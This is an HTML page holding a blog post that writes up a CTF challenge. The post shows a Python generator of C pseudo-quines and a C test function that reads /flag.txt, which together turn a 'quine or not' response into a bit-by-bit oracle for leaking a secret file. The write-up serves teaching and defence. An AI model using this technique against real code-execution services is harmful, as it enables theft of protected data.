@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <!-- Google analytics tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-CYGH5M4NVH"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-CYGH5M4NVH');
+  </script>
+
+  <!-- Metadata -->
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="noarchive">
+
+  <title>Quines as a Side-channel</title>
+  
+  <meta name="author" content="Ellis Michael">
+
+  <link rel="canonical" href="https://ellismichael.com/blog/2016/09/02/quines-as-a-side-channel/">
+  <link rel="shortcut icon" type="image/ico" href="/favicon.ico">
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="/feed.xml">
+
+  <!-- Custom fonts -->
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/academicons/css/academicons.min.css"/>
+
+  <!-- Custom CSS -->
+  <link href="/css/main.css" rel="stylesheet">
+</head>
+
+<body>
+  <header>
+    <div class="row">
+      <div class="title-wrapper">
+        <h1>Ellis Michael</h1>
+      </div>
+    </div>
+    <div class="row">
+      <div class="nav-wrapper"><nav><ul>
+        
+          <li>
+            <a href="/">Home</a>
+          </li>
+        
+          <li>
+            <a href="/publications/">Publications</a>
+          </li>
+        
+          <li>
+            <a href="/code/">Code</a>
+          </li>
+        
+          <li>
+            <a href="/cv/">CV</a>
+          </li>
+        
+      </ul></nav></div>
+    </div>
+  </header>
+
+  <main>
+    <div class="row">
+  <div class="std-content-wrapper">
+    <div class="post">
+  <h1>Quines as a Side-channel</h1>
+  
+  <p class="date">02 Sep 2016</p>
+
+  <p>I recently competed in <a href="https://icec.tf/">IceCTF</a>, and two of my favorite problems were
+about quines. A quine is a program which prints its own source code; the term
+was coined by Douglas Hofstadter in his (excellent) book, <em>Göedel, Escher,
+Bach</em>.</p>
+
+<h2>The Problem</h2>
+
+<p>The quine problems involved finding a vulnerability in a service (run on a
+remote machine) which accepted a C source file as input and repeatedly compiled
+the source file, ran the program, and overwrote the source file with the
+program&rsquo;s output. After some number of iterations the server would return the
+resulting source code, provided some conditions held (more on that below).</p>
+
+<p>In their purest form, quines should not take any input. For example, the
+following Python one-liner is considered &ldquo;cheating&rdquo;:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">print</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="n">__file__</span><span class="p">).</span><span class="n">read</span><span class="p">(),</span> <span class="n">end</span><span class="o">=</span><span class="s">""</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>However, pure quines are quite useless for the purposes of a CTF competition. If
+the quine service had only returned one bit of information, whether or not the
+input program was a <em>true</em> quine, then it would have been safe from the attack
+we used. However, the C programs the server ran could read from files, and the
+user the programs were run by had permissions to read <code class="language-plaintext highlighter-rouge">/flag.txt</code>, the file
+whose contents we were supposed to exfiltrate.</p>
+
+<p>In the first version of the quine problem, which sent programs through exactly
+20 iterations, I had the idea of simply wrapping a target program with layers of
+print statements. To illustrate, I&rsquo;ll do this in Python. Consider the following
+target program:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">print</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s">'/flag.txt'</span><span class="p">).</span><span class="n">read</span><span class="p">())</span>
+</code></pre></div></div>
+<p>If we wanted this program to be run during the final iteration and there were 5
+iterations, we would wrap it in 4 print statements like so:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">print</span><span class="p">(</span><span class="s">"print(</span><span class="se">\"</span><span class="s">print(</span><span class="se">\\\"</span><span class="s">print(</span><span class="se">\\\\\\\"</span><span class="s">print(open('/flag.txt').read())</span><span class="se">\\\\\\\"</span><span class="s">)</span><span class="se">\\\"</span><span class="s">)</span><span class="se">\"</span><span class="s">)"</span><span class="p">)</span>
+</code></pre></div></div>
+<p>This approach didn&rsquo;t work. The service spit out an error, complaining about
+source files not matching. We took this to mean that the service would only
+print out the final source file <em>if it matched the input source file</em>. In other
+words, we assumed that we would only get one bit of information out: <strong>quine or
+no quine</strong>. This turned out not to be the case, but I like the solution we came
+up with better than the intended one.</p>
+
+<h2>The Attack</h2>
+
+<p>Since we&rsquo;re assuming that the server only returns the <strong>quine or no quine</strong> bit,
+the key insight is that if the programs being run can take some input, then we
+can create programs which are quines if and only if some condition holds.</p>
+
+<p>I started with the following C quine, which I found on
+<a href="http://stackoverflow.com/questions/10238670/c-c-program-that-prints-its-own-source-code-as-its-output#answer-10240050">Stack Overflow</a>:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="kt">char</span><span class="o">*</span><span class="n">s</span><span class="o">=</span><span class="s">"#include &lt;stdio.h&gt;%cchar*s=%c%s%c;%cint main(void){printf(s,10,34,s,34,10,10);}%c"</span><span class="p">;</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span><span class="n">printf</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">34</span><span class="p">,</span><span class="n">s</span><span class="p">,</span><span class="mi">34</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">10</span><span class="p">);}</span>
+</code></pre></div></div>
+<p>How does it work? The critical bit is the <code class="language-plaintext highlighter-rouge">%s</code> inside <code class="language-plaintext highlighter-rouge">s</code>. This allows the
+program to print <code class="language-plaintext highlighter-rouge">s</code> using a copy of itself. The other trick is that it uses
+code points to print out characters that need escaping. (Try representing
+newlines as <code class="language-plaintext highlighter-rouge">\n</code> inside <code class="language-plaintext highlighter-rouge">s</code> and removing all the <code class="language-plaintext highlighter-rouge">10</code>s from the <code class="language-plaintext highlighter-rouge">printf</code>
+arguments, and you&rsquo;ll see what goes wrong.)</p>
+
+<p>Using that basic quine as a starting point, I came up with this generator in
+Python which creates C quines based on some function, <code class="language-plaintext highlighter-rouge">test</code> (passed to
+<code class="language-plaintext highlighter-rouge">gen_quine</code> as a string):</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">TO_REPLACE</span> <span class="o">=</span> <span class="s">"</span><span class="se">\n\r\"\'</span><span class="s">"</span>
+
+<span class="k">def</span> <span class="nf">code_point</span><span class="p">(</span><span class="n">c</span><span class="p">):</span>
+    <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">strip_normal_chars</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="n">c</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">s</span> <span class="k">if</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">TO_REPLACE</span><span class="p">])</span>
+
+<span class="k">def</span> <span class="nf">gen_codepoints</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="n">cps</span> <span class="o">=</span> <span class="s">','</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="n">code_point</span><span class="p">,</span> <span class="n">strip_normal_chars</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
+    <span class="k">if</span> <span class="n">cps</span><span class="p">:</span>
+        <span class="n">cps</span> <span class="o">+=</span> <span class="s">','</span>
+    <span class="k">return</span> <span class="n">cps</span>
+
+<span class="k">def</span> <span class="nf">gen_char_s</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="s">'%c'</span> <span class="k">if</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">TO_REPLACE</span> <span class="k">else</span> <span class="n">c</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">s</span><span class="p">])</span>
+
+<span class="k">def</span> <span class="nf">gen_quine</span><span class="p">(</span><span class="n">test_function</span><span class="p">):</span>
+    <span class="k">return</span> <span class="p">(</span>
+<span class="s">"""#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+%s
+char*s="#include &lt;stdio.h&gt;%%c#include &lt;stdlib.h&gt;%%c%s%%cchar*s=%%c%%s%%c;%%cint main(void){if(!test()){exit(1);}printf(s,10,10,%s10,34,s,34,10,10);}%%c";
+int main(void){if(!test()){exit(1);}printf(s,10,10,%s10,34,s,34,10,10);}
+"""</span>
+    <span class="p">)</span> <span class="o">%</span> <span class="p">(</span><span class="n">test_function</span><span class="p">,</span>
+         <span class="n">gen_char_s</span><span class="p">(</span><span class="n">test_function</span><span class="p">),</span>
+         <span class="n">gen_codepoints</span><span class="p">(</span><span class="n">test_function</span><span class="p">),</span> 
+         <span class="n">gen_codepoints</span><span class="p">(</span><span class="n">test_function</span><span class="p">))</span>
+</code></pre></div></div>
+<p>For example <code class="language-plaintext highlighter-rouge">gen_quine("int test() {return 1;}")</code> returns:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="kt">int</span> <span class="nf">test</span><span class="p">()</span> <span class="p">{</span><span class="k">return</span> <span class="mi">1</span><span class="p">;}</span>
+<span class="kt">char</span><span class="o">*</span><span class="n">s</span><span class="o">=</span><span class="s">"#include &lt;stdio.h&gt;%c#include &lt;stdlib.h&gt;%cint test() {return 1;}%cchar*s=%c%s%c;%cint main(void){if(!test()){exit(1);}printf(s,10,10,10,34,s,34,10,10);}%c"</span><span class="p">;</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">test</span><span class="p">()){</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);}</span><span class="n">printf</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">34</span><span class="p">,</span><span class="n">s</span><span class="p">,</span><span class="mi">34</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">10</span><span class="p">);}</span>
+</code></pre></div></div>
+<p>This is a pure quine.</p>
+
+<p>I&rsquo;ll leave you to figure out the fine points of the generator. There&rsquo;s no real
+insight, just some fiddling with details. The point is that using it, we can
+generate arbitrary (pseudo-)quines! We then used that generator with the
+following function:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span><span class="kt">int</span> <span class="nf">test</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/flag.txt"</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+    <span class="kt">char</span> <span class="n">x</span><span class="p">;</span>
+    <span class="n">pread</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">x</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">x</span> <span class="o">==</span> <span class="sc">'I'</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>It worked! The server told us that the generated program was, indeed, a quine.
+(An important fact here is that all flags had the format <code class="language-plaintext highlighter-rouge">IceCTF{...}</code>.) From
+there, all we had to do was loop through each bit of the flag and test it. Since
+all of the flags were less than 80 characters long, this took less than 640
+requests to the server (640 separate quines to checks). Not too bad.</p>
+
+<h2>Conclusion</h2>
+
+<p>Was arbitrary (pseudo-)quine generation necessary? Well, no. It turned out that
+the server printing out the final source code was important, and the problems
+could have been solved in a single request. But our way was more fun.</p>
+
+<p>Moral of the story: if you&rsquo;re ever building QCaaS (Quine Checking as a Service),
+be careful. You might be returning more information than you think.</p>
+
+
+
+</div>
+
+  </div>
+</div>
+
+  </main>
+
+  <footer>
+    <div class="row">
+      <div class="contact-info">
+        <h3>Around the Web</h3>
+        <ul>
+          
+            <li>
+              <a href="https://github.com/emichael"><i title="GitHub" class="fa fa-fw fa-github"></i></a>
+            </li>
+          
+            <li>
+              <a href="https://scholar.google.com/citations?user=UPrphFkAAAAJ"><i title="Google Scholar" class="ai ai-fw ai-google-scholar"></i></a>
+            </li>
+          
+            <li>
+              <a href="https://www.linkedin.com/in/rellismichael"><i title="LinkedIn" class="fa fa-fw fa-linkedin"></i></a>
+            </li>
+          
+            <li>
+              <a href="/feed.xml"><i title="RSS Feed" class="fa fa-fw fa-rss"></i></a>
+            </li>
+          
+        </ul>
+      </div>
+      <div class="contact-email">
+        <h3>Email</h3>
+        <p>(at ellis (dot ellismichael com))</p>
+      </div>
+    </div>
+
+    <div class="row">
+      <div class="copyright">
+        Copyright &copy; Ellis Michael 2013&ndash;2025 |
+        Last updated: April 14, 2025
+      </div>
+    </div>
+  </footer>
+
+  <!-- jQuery Version 1.11.0 -->
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+
+  <!-- Bootstrap Core JavaScript -->
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/js/bootstrap.min.js"></script>
+
+  <!-- Custom JavaScript -->
+  <script src="/js/main.js"></script>
+
+  
+  
+</body>
+</html>
